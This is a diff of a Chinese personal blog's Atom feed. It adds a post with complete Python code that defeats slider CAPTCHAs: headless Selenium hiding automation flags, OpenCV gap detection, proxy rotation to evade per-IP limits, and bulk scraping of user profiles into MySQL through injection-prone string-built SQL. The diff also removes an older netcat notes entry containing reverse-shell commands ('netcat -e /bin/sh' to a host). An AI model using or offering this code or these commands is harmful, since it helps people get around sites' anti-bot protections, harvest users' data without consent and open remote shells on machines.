@@ -4,13 +4,248 @@
   <title><![CDATA[shengsheng的博客]]></title>
   <link href="http://www.shengsheng.net/atom.xml" rel="self"/>
   <link href="http://www.shengsheng.net/"/>
-  <updated>2020-02-08T14:08:33+08:00</updated>
+  <updated>2020-02-08T14:09:39+08:00</updated>
   <id>http://www.shengsheng.net/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[划动验证码的破解]]></title>
+    <link href="http://www.shengsheng.net/15823712934354.html"/>
+    <updated>2020-02-22T19:34:53+08:00</updated>
+    <id>http://www.shengsheng.net/15823712934354.html</id>
+    <content type="html"><![CDATA[
+<p>最近需要获取某些信息，但每次页面都要滑动一次验证码实在太烦了，so研究一下破解方案。</p>
+
+<h1 id="toc_0">使用的技术</h1>
+
+<ul>
+<li>python3</li>
+<li>opencv</li>
+<li>pymydb</li>
+<li>selenium</li>
+</ul>
+
+<h1 id="toc_1">效果</h1>
+
+<p><a href="media/15823712934354/1582371835327952.mp4">1582371835327952</a></p>
+
+<h1 id="toc_2">核心思路</h1>
+
+<p>1) 使用selenium加载网站，定位到验证码的iframe<br/>
+2) 背景版，缺口图，使用opencv灰度图像分析出缺口位置。</p>
+
+<pre><code class="language-text">result = cv2.matchTemplate(target, template, cv2.TM_CCOEFF_NORMED)
+x, y = np.unravel_index(result.argmax(), result.shape)
+</code></pre>
+
+<p>3) 控制验证码的滑块到指定位置。<br/>
+4) 代理ip的使用，因为对于ip访问次数太多，验证码就算滑中了，也是不正确的。</p>
+
+<h1 id="toc_3">具体代码</h1>
+
+<pre><code class="language-text">#!/usr/bin/env python
+# encoding: utf-8
+
+import random
+import time
+import os
+import cv2
+import ssl
+import pymysql
+import urllib.request
+import numpy as np
+from PIL import Image
+from selenium.webdriver import ActionChains
+from selenium.webdriver import Chrome
+from selenium.webdriver import ChromeOptions
+from selenium.webdriver.support.ui import WebDriverWait
+class Login(object):
+    &quot;&quot;&quot;
+    python + seleniuum + cv2
+    &quot;&quot;&quot;
+    def __init__(self,proxyIP=&#39;&#39;):
+        # 如果是实际应用中，可在此处账号和密码
+        self.option = ChromeOptions()
+        # 不加ip，模拟验证码可能有问题
+        if(proxyIP):
+            self.option.add_argument(&quot;--proxy-server=&quot;+proxyIP);
+        self.option.add_argument(&#39;--headless&#39;);
+        self.option.add_experimental_option(&#39;excludeSwitches&#39;, [&#39;enable-automation&#39;])
+        self.driver = Chrome(options=self.option)
+    
+    def seturl(self,url):
+        self.url = url;
+    
+    @staticmethod
+    def get_postion(otemp, oblk):
+        &quot;&quot;&quot;
+        判断缺口位置
+        :param chunk: 缺口图片是原图
+        :param canves:
+        :return: 位置 x, y
+        &quot;&quot;&quot;
+        target = cv2.imread(otemp, 0)
+        template = cv2.imread(oblk, 0)
+        # w, h = target.shape[::-1]
+        temp = &#39;temp.jpg&#39;
+        targ = &#39;targ.jpg&#39;
+        #imwrite
+        cv2.imwrite(temp, template)
+        cv2.imwrite(targ, target)
+        
+        target = cv2.imread(targ)
+        target = cv2.cvtColor(target, cv2.COLOR_BGR2GRAY)
+        target = abs(255 - target)
+        
+        cv2.imwrite(targ, target)
+        target = cv2.imread(targ)
+        template = cv2.imread(temp)
+        result = cv2.matchTemplate(target, template, cv2.TM_CCOEFF_NORMED)
+        x, y = np.unravel_index(result.argmax(), result.shape)
+        return x, y
+
+    @staticmethod
+    def get_track(distance):
+        tracks = []
+        distance = int(distance);
+        tracks.append(distance)
+        return tracks;
+
+    @staticmethod
+    def urllib_download(imgurl, imgsavepath):
+        from urllib.request import urlretrieve
+        urlretrieve(imgurl, imgsavepath)
+        
+    def quit2(self):
+        self.driver.execute_script(&quot;window.close();&quot;);
+        self.driver.switch_to.window(self.driver.window_handles[-1])
+        
+    def quit(self):
+        self.driver.quit();
+        
+    def login_main(self, driver):
+        driver.switch_to.default_content()
+        #滑块iframe
+        driver.switch_to.frame(driver.find_element_by_tag_name(&quot;iframe&quot;))
+        # 大图
+        bk_block = driver.find_element_by_xpath(&#39;//img[@id=&quot;slideBkg&quot;]&#39;)  
+        web_image_width = bk_block.size
+        web_image_width = web_image_width[&#39;width&#39;]
+        bk_block_x = bk_block.location[&#39;x&#39;]
+     # 小滑块
+        slide_block = driver.find_element_by_xpath(&#39;//img[@id=&quot;slideBlock&quot;]&#39;)  
+        slide_block_x = slide_block.location[&#39;x&#39;]
+        bk_block = driver.find_element_by_xpath(&#39;//img[@id=&quot;slideBkg&quot;]&#39;).get_attribute(&#39;src&#39;) # 大图 url
+#       print(bk_block);
+        slide_block = driver.find_element_by_xpath(&#39;//img[@id=&quot;slideBlock&quot;]&#39;).get_attribute(&#39;src&#39;) # 小滑块 图片url
+#       print(slide_block);
+        slid_ing = driver.find_element_by_xpath(&#39;//div[@id=&quot;slide_bar_head&quot;]&#39;)  # 滑块
+
+        #下载图片分析
+        os.makedirs(&#39;./image/&#39;, exist_ok=True)
+        self.urllib_download(bk_block, &#39;./image/bkBlock.png&#39;)
+        self.urllib_download(slide_block, &#39;./image/slideBlock.png&#39;)
+        time.sleep(0.5)
+        img_bkblock = Image.open(&#39;./image/bkBlock.png&#39;)
+        bkblock_real_width = img_bkblock.size[0]
+        # 滑块宽度/大图背景宽度
+        width_scale = float(bkblock_real_width) / float(web_image_width)
+        #opencv分析,获取滑块与嵌块的位置
+        position = self.get_postion(&#39;./image/bkBlock.png&#39;, &#39;./image/slideBlock.png&#39;)
+        real_position = position[1] / width_scale
+        real_position = real_position - (slide_block_x - bk_block_x)
+        #滑动的轨迹
+        track_list = self.get_track(real_position)
+        # 点击鼠标左键，按住不放
+        ActionChains(driver).click_and_hold(on_element=slid_ing).perform()  
+        time.sleep(0.2)
+        #拖动滑块
+        for track in track_list:
+            #移动鼠标到嵌块距离
+            ActionChains(driver).move_by_offset(xoffset=track, yoffset=0).perform()
+        # 释放鼠标
+        ActionChains(driver).release(on_element=slid_ing).perform()
+
+    def main(self):
+        driver = self.driver
+        driver.maximize_window()
+        print(self.url);
+        #url 这里开始赋值
+        driver.get(self.url)
+        time.sleep(4)
+        self.login_main(driver)
+        driver.switch_to.default_content() #切换主页面
+        #获取相关详细信息
+        time.sleep(4)
+        # 这里获取不了，只能尝试再获取一次验证码的
+        try:
+            test = driver.find_element_by_class_name(&#39;profile-card-user-info-description&#39;)
+            #和对应的id存起来
+            content = test.text;  
+            return test.text;
+        except Exception as e:
+            reutrn;
+        
+#获取代理ip
+def getproxyIP():
+   # 大家可以找出免费的代码ip
+    proxyurl = &quot;xx&quot;;
+    response = urllib.request.urlopen(proxyurl)
+    proxyIP = response.read();
+    proxyIP = proxyIP.decode(&quot;unicode_escape&quot;)
+    proxyIP = str(proxyIP);
+    return proxyIP;
+    
+if __name__ == &#39;__main__&#39;:
+    ssl._create_default_https_context = ssl._create_unverified_context
+    #跑取url的组成
+    conn = pymysql.connect(host=&#39;127.0.0.1&#39;, port=3306, user=&#39;root&#39;, passwd=&#39;root&#39;, db=&#39;phpshow&#39;, charset=&#39;utf8mb4&#39;)
+    # 创建游标
+    cursor = conn.cursor()
+    while(1):
+        cursor.execute(&quot;select UserId from spider where crawl=&#39;1&#39; and intro is Null limit 10&quot;);
+        res = cursor.fetchall();
+        if res==False:
+            break;
+        proxyIP = getproxyIP();
+        print(proxyIP);
+        #这里要有异常处理
+        login = Login(proxyIP)
+        for val in res:
+            print(val[0]);
+            try:
+                time.sleep(1);
+                #url规则，手动更改
+                url = str(&quot;https://xx.com/search/author?keyword=&quot;)+str(val[0])+str(&quot;&amp;page=1&quot;);
+                
+                login.seturl(url);
+                text = login.main()
+                print(text);
+                if text:
+                    print(&quot;update&quot;);
+                    cursor2 = conn.cursor();
+                    # 表名
+                    update_sql = &quot;update xx set intro=&#39;&quot;+str(text)+&quot;&#39; where UserId = &#39;&quot;+str(val[0])+&quot;&#39;&quot;;
+                    print(update_sql);
+                    tmp = cursor2.execute(update_sql);
+                    conn.commit();
+                    cursor2.close;
+                #退出浏览器
+    #           login.quit();
+            except Exception as e:
+                login.quit2();
+                print(&quot;error&quot;);
+        login.quit();
+        print(&quot;---------------------------&quot;);
+    ```
+</code></pre>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[游戏运营相关参数]]></title>
@@ -676,43 +911,6 @@ class b exntends a{public static $a=&#39;2&#39;}</p>
 <p>但JS格式化，不完整，会有报错。。。</p>
 
 <p>谷歌一下，找到一款<a href="http://jsbeautifier.org/%EF%BC%8C%E6%84%9F%E8%A7%89%E4%B8%8D%E9%94%99%EF%BC%8C%E5%88%86%E4%BA%AB%E7%BB%99%E5%A4%A7%E5%AE%B6">http://jsbeautifier.org/，感觉不错，分享给大家</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[NetCat笔记]]></title>
-    <link href="http://www.shengsheng.net/15809578634347.html"/>
-    <updated>2020-02-06T10:57:43+08:00</updated>
-    <id>http://www.shengsheng.net/15809578634347.html</id>
-    <content type="html"><![CDATA[
-<p>date: 2015-08-18 21:38</p>
-
-<p>老实说黑客技术，不宜研究太深。但有机会将黑客技术用于正途，还是一件大好事。正所谓技术没有正邪，只是看使用的人。<br/>
-另外反向穿透太强大了。</p>
-
-<p>开启反向代理，需要修改netcat原代码，并进行重新编译。<br/>
-修改netcat.c<br/>
-如何想编译出 -e 和 -t 选项， 只要加上两条define 语句即可。</p>
-
-<h1 id="toc_0">define GAPING_SECURITY_HOLE</h1>
-
-<h1 id="toc_1">define TELNET</h1>
-
-<p>使用反向代理：</p>
-
-<p>输入输出分开<br/>
-服务端<br/>
-./netcat -vv -l -p 1221<br/>
-./netcat -vv -l -p 1222<br/>
-客户端<br/>
-./netcat 192.168.1.101 1221 | /bin/sh |nc 192.168.1.101 1222</p>
-
-<p>输入输出相同<br/>
-服务端<br/>
-./netcat -vv -l -p 1222<br/>
-客户端<br/>
-./netcat -e /bin/sh 192.168.1.101 1222</p>
 
 ]]></content>
   </entry>
